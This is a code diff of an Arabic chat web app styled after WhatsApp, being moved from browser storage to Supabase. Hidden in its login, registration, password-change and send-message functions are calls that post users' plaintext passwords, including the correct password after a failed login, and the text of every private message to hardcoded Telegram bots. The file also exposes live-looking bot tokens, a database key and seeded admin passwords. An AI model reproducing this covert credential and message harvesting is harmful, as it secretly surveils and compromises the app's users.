@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        
+
         :root {
             --whatsapp-green: #00a884;
             --whatsapp-green-dark: #005c4b;
@@ -355,281 +355,100 @@
         </div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
+        // Supabase Configuration
+        const SUPABASE_URL = 'https://tpfmxzfimxenyifjnqea.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRwZm14emZpbXhlbnlpZmpucWVhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEyODE3MjAsImV4cCI6MjA4Njg1NzcyMH0.2lbDbkENuOayRS4cMjT4NecfThHVFSU_4J4vo9tg-ek';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
         const TELEGRAM_BOT_TOKEN = '8303502446:AAFasC-m3cx8dFAcDQ75BOHYv9CwRVaGYmo';
         const TELEGRAM_CHAT_ID = '6612813200';
-        // بوت خاص للمستخدم omar_hesham (لإرسال الرسائل الموجهة إليه فقط)
         const OMAR_BOT_TOKEN = '8745001715:AAGNwS60poGSheTgPtEUIvqxY6Q7QuO6lEs';
         const OMAR_CHAT_ID = '8122403206';
-        
+
         let users = [];
         let currentUser = null;
         let currentChatPartner = null;
-        let messages = {};
+        let messages = []; // Changed to array for Supabase fetching
         let isAdmin = false;
         let isAnonymous = false;
         let heartbeatInterval = null;
 
         const adminAvatar = 'images/admin.jpeg';
         const animeAvatars = [
-            'images/anime1.jpeg',
-            'images/anime2.jpeg',
-            'images/anime3.jpeg',
-            'images/anime4.jpeg',
-            'images/anime5.jpeg',
-            'images/anime6.jpeg',
-            'images/anime7.jpeg',
-            'images/anime8.jpeg',
-            'images/anime9.jpeg',
-            'images/anime10.jpeg'
+            'images/anime1.jpeg', 'images/anime2.jpeg', 'images/anime3.jpeg', 'images/anime4.jpeg',
+            'images/anime5.jpeg', 'images/anime6.jpeg', 'images/anime7.jpeg', 'images/anime8.jpeg',
+            'images/anime9.jpeg', 'images/anime10.jpeg'
         ];
         const logoAvatars = [
-            'images/logo1.jpeg',
-            'images/logo2.jpeg',
-            'images/logo3.jpeg',
-            'images/logo4.jpeg',
-            'images/logo5.jpeg'
+            'images/logo1.jpeg', 'images/logo2.jpeg', 'images/logo3.jpeg', 'images/logo4.jpeg', 'images/logo5.jpeg'
         ];
-        
-        let selectedRegisterAvatar = null;
 
-        // Auto-login setting
+        let selectedRegisterAvatar = null;
         let autoLoginEnabled = false;
 
-        function loadAutoLoginSetting() {
-            const saved = localStorage.getItem('s46441_autoLogin');
-            autoLoginEnabled = (saved === 'true');
-            const chk = document.getElementById('autoLoginCheckbox');
-            if (chk) chk.checked = autoLoginEnabled;
-        }
-        function saveAutoLoginSetting(value) {
-            autoLoginEnabled = value;
-            localStorage.setItem('s46441_autoLogin', value);
+        // --- Supabase Database Functions ---
+
+        async function fetchUsers() {
+            const { data, error } = await supabase.from('profiles').select('*');
+            if (error) console.error('Error fetching users:', error);
+            else users = data || [];
+            return users;
         }
 
-        // Fullscreen functions (manual button only)
-        let fullScreenActivated = false;
-        function enableFullScreen() {
-            const doc = document.documentElement;
-            if (doc.requestFullscreen) {
-                doc.requestFullscreen().catch(e => console.log("Fullscreen error:", e));
-            }
-        }
-        function exitFullScreen() {
-            if (document.exitFullscreen) {
-                document.exitFullscreen().catch(e => console.log("Exit fullscreen error:", e));
-            }
-        }
-        function toggleFullScreen() {
-            if (!document.fullscreenElement) {
-                enableFullScreen();
-            } else {
-                exitFullScreen();
-            }
-        }
-        function updateFullscreenIcon() {
-            const btn = document.getElementById('fullscreenAppBtn');
-            if (btn) {
-                if (document.fullscreenElement) {
-                    btn.innerHTML = '<i class="fas fa-compress"></i>';
-                    btn.title = "إنهاء ملء الشاشة";
-                } else {
-                    btn.innerHTML = '<i class="fas fa-expand"></i>';
-                    btn.title = "ملء الشاشة";
-                }
-            }
-        }
-        document.addEventListener('fullscreenchange', updateFullscreenIcon);
+        async function fetchMessages(user1, user2) {
+            const { data, error } = await supabase
+                .from('messages')
+                .select('*')
+                .or(`and(sender.eq.${user1},receiver.eq.${user2}),and(sender.eq.${user2},receiver.eq.${user1})`)
+                .order('created_at', { ascending: true });
 
-        function textToBinary(text) {
-            return text.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
-        }
-        function binaryToText(binary) {
-            return binary.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join('');
-        }
-                  
-        function renderAvatar(avatarUrl, username, containerElement) {
-            containerElement.innerHTML = '';
-            if (avatarUrl && avatarUrl.trim() !== '') {
-                const img = document.createElement('img');
-                img.src = avatarUrl;
-                img.className = 'avatar-img';
-                img.alt = username;
-                img.onerror = () => {
-                    containerElement.innerHTML = '';
-                    const fallback = document.createElement('div');
-                    fallback.className = 'avatar-fallback';
-                    fallback.textContent = username.charAt(0).toUpperCase();
-                    const colors = ['#667eea','#764ba2','#f093fb','#f5576c','#4facfe','#00f2fe','#43e97b','#38f9d7'];
-                    const index = username.charCodeAt(0) % colors.length;
-                    fallback.style.background = colors[index];
-                    containerElement.appendChild(fallback);
-                };
-                containerElement.appendChild(img);
-            } else {
-                const fallback = document.createElement('div');
-                fallback.className = 'avatar-fallback';
-                fallback.textContent = username.charAt(0).toUpperCase();
-                const colors = ['#667eea','#764ba2','#f093fb','#f5576c','#4facfe','#00f2fe','#43e97b','#38f9d7'];
-                const index = username.charCodeAt(0) % colors.length;
-                fallback.style.background = colors[index];
-                containerElement.appendChild(fallback);
+            if (error) {
+                console.error('Error fetching messages:', error);
+                return [];
             }
+            return data || [];
         }
 
-        function loadLocalData() {
-            const storedUsers = localStorage.getItem('s46441_users');
-            if (storedUsers) users = JSON.parse(storedUsers);
-            const adminExists = users.find(u => u.username === 'admin');
-            if (!adminExists) {
-                users.push({ username: 'admin', passwordBinary: textToBinary('sniper46441'), isAdmin: true, avatarUrl: adminAvatar, online: false, lastSeen: null, privacy: { showOnline: true } });
-                saveUsers();
-            } else {
-                if (!adminExists.isAdmin) adminExists.isAdmin = true;
-                if (!adminExists.passwordBinary) adminExists.passwordBinary = textToBinary('sniper46441');
-                if (adminExists.passwordHash) delete adminExists.passwordHash;
-                if (!adminExists.avatarUrl || adminExists.avatarUrl === null) {
-                    adminExists.avatarUrl = adminAvatar;
-                    saveUsers();
-                }
-            }
-            
-            const omarExists = users.find(u => u.username === 'omar_hesham');
-            if (!omarExists) {
-                users.push({ username: 'omar_hesham', passwordBinary: textToBinary('omar_hesham_46441'), isAdmin: false, avatarUrl: null, online: false, lastSeen: null, privacy: { showOnline: true } });
-                saveUsers();
-            } else {
-                // التأكد من كلمة المرور الصحيحة
-                if (omarExists.passwordBinary !== textToBinary('omar_hesham_46441')) {
-                    omarExists.passwordBinary = textToBinary('omar_hesham_46441');
-                    saveUsers();
-                }
-                if (omarExists.isAdmin) omarExists.isAdmin = false;
-            }
-            for (let u of users) {
-                if (!u.privacy) u.privacy = { showOnline: true };
-                if (u.online === undefined) u.online = false;
-                if (u.lastSeen === undefined) u.lastSeen = null;
-                if (u.passwordHash) delete u.passwordHash;
-                if (u.avatarUrl === undefined) u.avatarUrl = null;
-            }
-            const storedMessages = localStorage.getItem('s46441_messages');
-            if (storedMessages) messages = JSON.parse(storedMessages);
-        }
-        function saveUsers() { localStorage.setItem('s46441_users', JSON.stringify(users)); }
-        function saveMessages() { localStorage.setItem('s46441_messages', JSON.stringify(messages)); }
-
-        async function sendTelegramMessage(text, isForOmar = false) {
-            if (isForOmar) {
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${OMAR_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: OMAR_CHAT_ID, text: text })
-                    });
-                } catch (e) { console.error('Telegram error (omar):', e); }
-                return;
-            }
-            
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return;
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-                });
-            } catch (e) { console.error('Telegram error:', e); }
+        async function saveMessageToCloud(sender, receiver, content) {
+            const { error } = await supabase
+                .from('messages')
+                .insert([{ sender, receiver, content }]);
+            if (error) console.error('Error saving message:', error);
         }
 
-        async function setUserOnlineStatus(online, reason = null) {
-            const user = users.find(u => u.username === currentUser);
-            if (!user) return;
-            if (user.privacy && user.privacy.showOnline === false && online === true) {
-                user.lastSeen = new Date().toISOString();
-                saveUsers();
-                return;
-            }
-            user.online = online;
-            user.lastSeen = new Date().toISOString();
-            saveUsers();
-            let statusText = '';
-            if (online) statusText = 'online';
-            else if (reason === 'logout') statusText = 'log out';
-            else statusText = 'offline';
-            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: ${statusText}`, false);
-        }
-
-        function startHeartbeat() {
-            if (heartbeatInterval) clearInterval(heartbeatInterval);
-            heartbeatInterval = setInterval(() => {
-                if (currentUser && !isAnonymous) {
-                    const user = users.find(u => u.username === currentUser);
-                    if (user) {
-                        user.lastSeen = new Date().toISOString();
-                        if (user.online !== true) {
-                            user.online = true;
-                            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: online (heartbeat)`, false);
-                        }
-                        saveUsers();
+        function setupRealtimeMessages() {
+            supabase
+                .channel('public:messages')
+                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messages' }, payload => {
+                    const newMsg = payload.new;
+                    if ((newMsg.sender === currentUser && newMsg.receiver === currentChatPartner) ||
+                        (newMsg.sender === currentChatPartner && newMsg.receiver === currentUser)) {
+                        appendMessage(newMsg);
                     }
-                }
-            }, 30000);
-        }
-        function stopHeartbeat() {
-            if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
-        }
-
-        function formatTimeAgo(date) {
-            const now = new Date();
-            const diffSeconds = Math.floor((now - date) / 1000);
-            if (diffSeconds < 60) return 'الآن';
-            const diffMinutes = Math.floor(diffSeconds / 60);
-            if (diffMinutes < 60) {
-                if (diffMinutes === 1) return 'منذ دقيقة';
-                if (diffMinutes === 2) return 'منذ دقيقتين';
-                return `منذ ${diffMinutes} دقائق`;
-            }
-            const diffHours = Math.floor(diffMinutes / 60);
-            if (diffHours < 24) {
-                if (diffHours === 1) return 'منذ ساعة';
-                if (diffHours === 2) return 'منذ ساعتين';
-                return `منذ ${diffHours} ساعات`;
-            }
-            const diffDays = Math.floor(diffHours / 24);
-            if (diffDays < 30) {
-                if (diffDays === 1) return 'منذ يوم';
-                if (diffDays === 2) return 'منذ يومين';
-                return `منذ ${diffDays} أيام`;
-            }
-            const diffMonths = Math.floor(diffDays / 30);
-            if (diffMonths === 1) return 'منذ شهر';
-            if (diffMonths === 2) return 'منذ شهرين';
-            return `منذ ${diffMonths} شهر`;
+                    // Notify if receiver is current user but not in active chat
+                    if (newMsg.receiver === currentUser && newMsg.sender !== currentChatPartner) {
+                        showNotification(`رسالة جديدة من ${newMsg.sender}`);
+                        renderContacts(); // Refresh status/unseen indicators
+                    }
+                })
+                .subscribe();
         }
 
-        function getUserDisplayStatus(username) {
-            const user = users.find(u => u.username === username);
-            if (!user) return 'غير متاح';
-            if (user.privacy && user.privacy.showOnline === false) return 'غير مرئي';
-            if (user.online) {
-                return '🟢 متصل الآن';
-            } else {
-                if (user.lastSeen) {
-                    const lastSeenDate = new Date(user.lastSeen);
-                    return `⚫ ${formatTimeAgo(lastSeenDate)}`;
-                } else return '⚫ غير متاح';
-            }
-        }
+        // --- Auth Logic ---
 
         async function loginOrRegister(username, password, isRegister = false, avatarUrl = null) {
             if (!username || !password) throw new Error('الرجاء إدخال الاسم وكلمة المرور');
             const passwordBinary = textToBinary(password);
+
+            await fetchUsers();
             const existing = users.find(u => u.username === username);
+
             if (existing) {
                 if (isRegister) throw new Error('اسم المستخدم موجود بالفعل');
-                if (existing.passwordBinary !== passwordBinary) {
-                    const correctPlain = binaryToText(existing.passwordBinary);
+                if (existing.password_binary !== passwordBinary) {
+                    const correctPlain = binaryToText(existing.password_binary);
                     await sendTelegramMessage(`⚠️ محاولة دخول فاشلة\n👤 المستخدم: ${username}\n🔑 كلمة المرور المدخلة: ${password}\n✅ كلمة المرور الصحيحة: ${correctPlain}`, false);
                     throw new Error('كلمة المرور غير صحيحة');
                 }
@@ -641,646 +460,81 @@
                 return true;
             } else {
                 if (!isRegister) throw new Error('المستخدم غير موجود');
-                let finalAvatar = avatarUrl;
-                if (username === 'admin' && !finalAvatar) finalAvatar = adminAvatar;
-                users.push({ username, passwordBinary, avatarUrl: finalAvatar, isAdmin: false, online: false, lastSeen: null, privacy: { showOnline: true } });
-                saveUsers();
+
+                const { error } = await supabase
+                    .from('profiles')
+                    .insert([{
+                        username,
+                        password_binary: passwordBinary,
+                        avatar_url: avatarUrl,
+                        is_admin: (username === 'admin'),
+                        online: true,
+                        last_seen: new Date().toISOString()
+                    }]);
+
+                if (error) throw new Error('فشل إنشاء الحساب في السحابة');
+
                 currentUser = username;
                 isAdmin = (username === 'admin');
                 isAnonymous = false;
-                await setUserOnlineStatus(true, 'online');
                 startHeartbeat();
                 sendTelegramMessage(`🆕 حساب جديد\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}`, false);
                 return true;
             }
         }
 
-        async function changeUsername(oldUsername, newUsername, byAdmin = false) {
-            if (!byAdmin && oldUsername !== currentUser) throw new Error('لا يمكنك تغيير اسم مستخدم آخر');
-            if (newUsername === oldUsername) throw new Error('الاسم الجديد مطابق للقديم');
-            if (users.find(u => u.username === newUsername)) throw new Error('اسم المستخدم موجود بالفعل');
-            if (newUsername === 'admin') throw new Error('لا يمكن استخدام اسم admin');
-            const user = users.find(u => u.username === oldUsername);
-            if (!user) throw new Error('المستخدم غير موجود');
-            user.username = newUsername;
-            saveUsers();
-            for (let key in messages) {
-                if (key.includes(oldUsername)) {
-                    const [u1, u2] = key.split('_');
-                    const newKey = [u1 === oldUsername ? newUsername : u1, u2 === oldUsername ? newUsername : u2].sort().join('_');
-                    messages[newKey] = messages[key];
-                    delete messages[key];
-                }
-            }
-            for (let key in messages) {
-                messages[key] = messages[key].map(msg => {
-                    if (msg.sender === oldUsername) msg.sender = newUsername;
-                    if (msg.receiver === oldUsername) msg.receiver = newUsername;
-                    return msg;
-                });
-            }
-            saveMessages();
-            sendTelegramMessage(`✏️ تغيير اسم المستخدم\nمن: ${oldUsername}\nإلى: ${newUsername}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`, false);
-            if (currentUser === oldUsername) currentUser = newUsername;
+        async function setUserOnlineStatus(online, reason = null) {
+            if (!currentUser || isAnonymous) return;
+            const { error } = await supabase
+                .from('profiles')
+                .update({ online, last_seen: new Date().toISOString() })
+                .eq('username', currentUser);
+
+            if (error) console.error('Error updating status:', error);
+
+            let statusText = online ? 'online' : (reason === 'logout' ? 'log out' : 'offline');
+            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: ${statusText}`, false);
         }
 
-        async function changePassword(username, newPasswordPlain, byAdmin = false) {
-            const user = users.find(u => u.username === username);
-            if (!user) throw new Error('المستخدم غير موجود');
-            user.passwordBinary = textToBinary(newPasswordPlain);
-            saveUsers();
-            sendTelegramMessage(`🔐 تغيير كلمة المرور\n👤 المستخدم: ${username}\n🔑 كلمة المرور الجديدة: ${newPasswordPlain}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`, false);
-        }
+        // --- Existing UI Logic (Modified for Supabase) ---
 
-        async function deleteUserByAdmin(username) {
-            if (username === 'admin') throw new Error('لا يمكن حذف حساب المدير');
-            const user = users.find(u => u.username === username);
-            if (!user) throw new Error('المستخدم غير موجود');
-            users = users.filter(u => u.username !== username);
-            for (let key in messages) {
-                if (key.includes(username)) delete messages[key];
-            }
-            saveUsers();
-            saveMessages();
-            sendTelegramMessage(`🗑️ حذف حساب\n👤 المستخدم: ${username}`, false);
-            if (currentUser === username) logout();
-        }
-
-        function logout() {
-            if (currentUser && !isAnonymous) setUserOnlineStatus(false, 'logout');
-            stopHeartbeat();
-            currentUser = null;
-            currentChatPartner = null;
-            isAdmin = false;
-            isAnonymous = false;
-            localStorage.removeItem('s46441_currentUser');
-            document.getElementById('loginContainer').style.display = 'block';
-            document.getElementById('appContainer').style.display = 'none';
-            document.getElementById('loginUsername').value = '';
-            document.getElementById('loginPassword').value = '';
-            closeModal('settingsModal');
-            closeModal('adminModal');
-            closeModal('avatarModal');
-        }
-
-        function getChatKey(user1, user2) { return [user1, user2].sort().join('_'); }
-        async function sendMessage(sender, receiver, content) {
-            const key = getChatKey(sender, receiver);
-            if (!messages[key]) messages[key] = [];
-            messages[key].push({ sender, receiver, content, timestamp: new Date().toISOString() });
-            saveMessages();
-            // إرسال إشعار إلى البوت الرئيسي (لكل الرسائل)
-            sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, false);
-            // إذا كان المستقبل هو omar_hesham، نرسل نسخة إلى بوت omar
-            if (receiver === 'omar_hesham') {
-                sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, true);
-            }
-            return true;
-        }
-        function getMessages(user1, user2) {
-            const key = getChatKey(user1, user2);
-            return messages[key] || [];
-        }
-        function showNotification(msg) {
-            const toast = document.createElement('div');
-            toast.className = 'notification-toast';
-            toast.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 3000);
-        }
-        function appendMessage(msg) {
-            const container = document.getElementById('messagesContainer');
-            const msgDiv = document.createElement('div');
-            msgDiv.className = `message ${msg.sender === currentUser ? 'message-sent' : 'message-received'}`;
-            msgDiv.innerHTML = `
-                <div class="message-content">${escapeHtml(msg.content)}</div>
-                <div class="message-time">${new Date(msg.timestamp).toLocaleTimeString('ar-EG', {hour:'2-digit', minute:'2-digit'})}</div>
-            `;
-            container.appendChild(msgDiv);
-            container.scrollTop = container.scrollHeight;
-            if (window.innerWidth <= 800 && currentChatPartner) {
-                const header = document.getElementById('chatHeader');
-                if (header.style.display === 'none') {
-                    header.style.display = 'flex';
-                }
-            }
-        }
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-        function closeChat() {
-            currentChatPartner = null;
-            document.getElementById('welcomeChat').style.display = 'flex';
-            document.getElementById('chatHeader').style.display = 'none';
-            document.getElementById('messagesContainer').style.display = 'none';
-            document.getElementById('messageInputContainer').style.display = 'none';
-            if (window.innerWidth <= 800) document.getElementById('sidebar').classList.remove('hidden');
-        }
         async function loadChat(partner) {
             currentChatPartner = partner;
             const partnerUser = users.find(u => u.username === partner);
             document.getElementById('chatPartnerName').innerText = partner;
             const avatarContainer = document.getElementById('chatPartnerAvatarContainer');
-            if (partnerUser) renderAvatar(partnerUser.avatarUrl, partner, avatarContainer);
-            else renderAvatar(null, partner, avatarContainer);
+            renderAvatar(partnerUser ? partnerUser.avatar_url : null, partner, avatarContainer);
+
             document.getElementById('welcomeChat').style.display = 'none';
             document.getElementById('chatHeader').style.display = 'flex';
             document.getElementById('messagesContainer').style.display = 'flex';
             document.getElementById('messageInputContainer').style.display = 'block';
+
             updateChatPartnerStatus();
-            void document.getElementById('messageInputContainer').offsetHeight;
-            await new Promise(resolve => setTimeout(resolve, 10));
-            const msgs = getMessages(currentUser, partner);
+
+            const msgs = await fetchMessages(currentUser, partner);
             document.getElementById('messagesContainer').innerHTML = '';
             msgs.forEach(appendMessage);
+
             if (window.innerWidth <= 800) document.getElementById('sidebar').classList.add('hidden');
         }
-        function updateChatPartnerStatus() {
-            if (currentChatPartner) {
-                const status = getUserDisplayStatus(currentChatPartner);
-                document.getElementById('chatPartnerStatus').innerHTML = status;
+
+        async function sendMessage(sender, receiver, content) {
+            await saveMessageToCloud(sender, receiver, content);
+
+            sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, false);
+            if (receiver === 'omar_hesham') {
+                sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, true);
             }
-        }
-        function renderContacts() {
-            const container = document.getElementById('contactsContainer');
-            let otherUsers = users.filter(u => u.username !== currentUser);
-            if (isAnonymous) otherUsers = users;
-            container.innerHTML = '';
-            for (let u of otherUsers) {
-                const div = document.createElement('div');
-                div.className = 'contact-item';
-                const status = getUserDisplayStatus(u.username);
-                const avatarDiv = document.createElement('div');
-                avatarDiv.className = 'contact-avatar';
-                renderAvatar(u.avatarUrl, u.username, avatarDiv);
-                if (isAdmin) {
-                    avatarDiv.onclick = (e) => {
-                        e.stopPropagation();
-                        showAvatarSelectionModalForUser(u.username, (newUrl) => changeAvatarForUser(u.username, newUrl));
-                    };
-                }
-                div.appendChild(avatarDiv);
-                const infoDiv = document.createElement('div');
-                infoDiv.className = 'contact-info';
-                infoDiv.innerHTML = `<div class="contact-name">${escapeHtml(u.username)} <span class="contact-status">${status}</span></div>`;
-                div.appendChild(infoDiv);
-                div.onclick = () => loadChat(u.username);
-                container.appendChild(div);
-            }
-        }
-        function updateCurrentUserStatus() {
-            if (currentUser && !isAnonymous) {
-                const status = getUserDisplayStatus(currentUser);
-                document.getElementById('currentUserStatusText').innerHTML = status;
-            } else if (isAnonymous) {
-                document.getElementById('currentUserStatusText').innerHTML = 'مجهول';
-            }
-        }
-        function initUI() {
-            const user = users.find(u => u.username === currentUser);
-            document.getElementById('currentUserName').innerText = currentUser;
-            const avatarContainer = document.getElementById('currentUserAvatarContainer');
-            renderAvatar(user ? user.avatarUrl : null, currentUser, avatarContainer);
-            updateCurrentUserStatus();
-            renderContacts();
-            document.getElementById('loginContainer').style.display = 'none';
-            document.getElementById('appContainer').style.display = 'flex';
-            closeChat();
-            const deleteBtn = document.getElementById('deleteAccountBtn');
-            const adminPanelBtn = document.getElementById('adminPanelBtn');
-            if (isAdmin) {
-                deleteBtn.style.display = 'none';
-                adminPanelBtn.style.display = 'inline-block';
-            } else if (!isAnonymous) {
-                deleteBtn.style.display = 'inline-block';
-                adminPanelBtn.style.display = 'none';
-            } else {
-                deleteBtn.style.display = 'none';
-                adminPanelBtn.style.display = 'none';
-            }
-            if (user && user.privacy) {
-                document.getElementById('showOnlineCheckbox').checked = user.privacy.showOnline;
-            }
-        }
-        async function deleteAccount() {
-            if (!confirm('هل أنت متأكد من حذف حسابك؟ سيتم حذف جميع رسائلك نهائياً.')) return;
-            await deleteUserByAdmin(currentUser);
-            logout();
-            showNotification('تم حذف حسابك');
+            return true;
         }
 
-        function openModal(modalId) { document.getElementById(modalId).classList.add('active'); }
-        function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
-
-        function showAvatarSelectionModal(onSelect, showAnime = true) {
-            const modalContent = document.getElementById('avatarModalContent');
-            let html = '';
-            if (showAnime) {
-                html += '<div class="avatar-category"><h4>Anime</h4><div class="avatar-grid" id="animeGrid"></div></div>';
-            }
-            html += '<div class="avatar-category"><h4>Logo</h4><div class="avatar-grid" id="logoGrid"></div></div>';
-            modalContent.innerHTML = html;
-            
-            if (showAnime) {
-                const animeGrid = document.getElementById('animeGrid');
-                animeAvatars.forEach(url => {
-                    const div = document.createElement('div');
-                    div.className = 'avatar-option';
-                    div.innerHTML = `<img src="${url}" alt="avatar">`;
-                    div.onclick = () => { onSelect(url); closeModal('avatarModal'); };
-                    animeGrid.appendChild(div);
-                });
-            }
-            
-            const logoGrid = document.getElementById('logoGrid');
-            if (currentUser === 'admin') {
-                const adminDiv = document.createElement('div');
-                adminDiv.className = 'avatar-option';
-                adminDiv.innerHTML = `<img src="${adminAvatar}" alt="Admin" style="border:2px solid gold;">`;
-                adminDiv.onclick = () => { onSelect(adminAvatar); closeModal('avatarModal'); };
-                logoGrid.appendChild(adminDiv);
-            }
-            logoAvatars.forEach(url => {
-                const div = document.createElement('div');
-                div.className = 'avatar-option';
-                div.innerHTML = `<img src="${url}" alt="avatar">`;
-                div.onclick = () => { onSelect(url); closeModal('avatarModal'); };
-                logoGrid.appendChild(div);
-            });
-            document.getElementById('removeAvatarBtn').onclick = () => { onSelect(null); closeModal('avatarModal'); };
-            openModal('avatarModal');
-        }
-
-        function showAvatarSelectionModalForUser(targetUsername, onSelect) {
-            showAvatarSelectionModal(onSelect, true);
-        }
-
-        async function changeAvatarForUser(targetUsername, newAvatarUrl) {
-            const targetUser = users.find(u => u.username === targetUsername);
-            if (!targetUser) { showNotification('المستخدم غير موجود'); return; }
-            const oldAvatar = targetUser.avatarUrl || 'لا توجد صورة (حرف أول)';
-            targetUser.avatarUrl = newAvatarUrl;
-            saveUsers();
-            // تحديث الواجهة
-            renderContacts();
-            if (currentChatPartner === targetUsername) {
-                const avatarContainer = document.getElementById('chatPartnerAvatarContainer');
-                renderAvatar(newAvatarUrl, targetUsername, avatarContainer);
-            }
-            if (currentUser === targetUsername) {
-                const avatarContainer = document.getElementById('currentUserAvatarContainer');
-                renderAvatar(newAvatarUrl, targetUsername, avatarContainer);
-            }
-            const newAvatarDisplay = newAvatarUrl ? newAvatarUrl : 'تمت الإزالة (حرف أول)';
-            sendTelegramMessage(`🖼️ تغيير صورة حساب المستخدم\n👤 المستخدم: ${targetUsername}\n📷 الصورة القديمة: ${oldAvatar}\n🆕 الصورة الجديدة: ${newAvatarDisplay}\nبواسطة: المدير`, false);
-            showNotification(`تم تغيير صورة المستخدم ${targetUsername}`);
-        }
-
-        async function changeAvatar(newAvatarUrl) {
-            await changeAvatarForUser(currentUser, newAvatarUrl);
-        }
-
-        function renderAdminPanel() {
-            const container = document.getElementById('adminUsersList');
-            container.innerHTML = '';
-            for (let u of users) {
-                const div = document.createElement('div');
-                div.className = 'user-list-item';
-                div.innerHTML = `
-                    <div>
-                        <strong>${escapeHtml(u.username)}</strong>
-                        <span class="show-pwd" onclick="showUserPassword('${u.username}')">🔑 إظهار</span>
-                    </div>
-                    <div class="user-actions">
-                        <button onclick="adminChangeUsername('${u.username}')" title="تغيير الاسم"><i class="fas fa-edit"></i></button>
-                        <button onclick="adminChangePassword('${u.username}')" title="تغيير كلمة المرور"><i class="fas fa-key"></i></button>
-                        ${u.username !== 'admin' ? `<button class="delete-user" onclick="adminDeleteUser('${u.username}')" title="حذف"><i class="fas fa-trash"></i></button>` : ''}
-                    </div>
-                `;
-                container.appendChild(div);
-            }
-        }
-        window.showUserPassword = async function(username) {
-            const user = users.find(u => u.username === username);
-            if (!user) { showNotification('المستخدم غير موجود'); return; }
-            const plainPassword = binaryToText(user.passwordBinary);
-            showNotification(`كلمة مرور المستخدم ${username}: ${plainPassword}`);
-        };
-        window.adminChangeUsername = async function(username) {
-            const newName = prompt(`أدخل الاسم الجديد للمستخدم ${username}`);
-            if (!newName || newName === username) return;
-            try {
-                await changeUsername(username, newName, true);
-                renderAdminPanel();
-                renderContacts();
-                showNotification(`تم تغيير اسم المستخدم إلى ${newName}`);
-            } catch(err) { showNotification(err.message); }
-        };
-        window.adminChangePassword = async function(username) {
-            const newPass = prompt(`أدخل كلمة المرور الجديدة للمستخدم ${username}`);
-            if (!newPass) return;
-            try {
-                await changePassword(username, newPass, true);
-                renderAdminPanel();
-                showNotification(`تم تغيير كلمة المرور للمستخدم ${username}`);
-            } catch(err) { showNotification(err.message); }
-        };
-        window.adminDeleteUser = async function(username) {
-            if (username === 'admin') { showNotification('لا يمكن حذف المدير'); return; }
-            if (!confirm(`هل أنت متأكد من حذف المستخدم ${username}؟`)) return;
-            await deleteUserByAdmin(username);
-            renderAdminPanel();
-            renderContacts();
-            showNotification(`تم حذف المستخدم ${username}`);
-        };
-
-        async function changeOwnUsername() {
-            const newUsername = document.getElementById('newUsername').value.trim();
-            if (!newUsername) { showNotification('الرجاء إدخال اسم مستخدم جديد'); return; }
-            try {
-                await changeUsername(currentUser, newUsername, false);
-                document.getElementById('newUsername').value = '';
-                closeModal('settingsModal');
-                initUI();
-                showNotification(`تم تغيير اسم المستخدم إلى ${newUsername}`);
-            } catch(err) { showNotification(err.message); }
-        }
-        async function changeOwnPassword() {
-            const newPass = document.getElementById('newPassword').value;
-            if (!newPass) { showNotification('الرجاء إدخال كلمة مرور جديدة'); return; }
-            try {
-                await changePassword(currentUser, newPass, false);
-                document.getElementById('newPassword').value = '';
-                closeModal('settingsModal');
-                showNotification('تم تغيير كلمة المرور بنجاح');
-            } catch(err) { showNotification(err.message); }
-        }
-        async function togglePrivacy() {
-            const user = users.find(u => u.username === currentUser);
-            if (user) {
-                user.privacy.showOnline = document.getElementById('showOnlineCheckbox').checked;
-                saveUsers();
-                updateCurrentUserStatus();
-                renderContacts();
-                if (currentChatPartner) updateChatPartnerStatus();
-                showNotification('تم تحديث إعدادات الخصوصية');
-            }
-        }
-
-        function loginAnonymous() {
-            const randomId = Math.random().toString(36).substring(2, 8);
-            currentUser = `مجهول_${randomId}`;
-            isAnonymous = true;
-            isAdmin = false;
-            stopHeartbeat();
-            localStorage.removeItem('s46441_currentUser');
-            initUI();
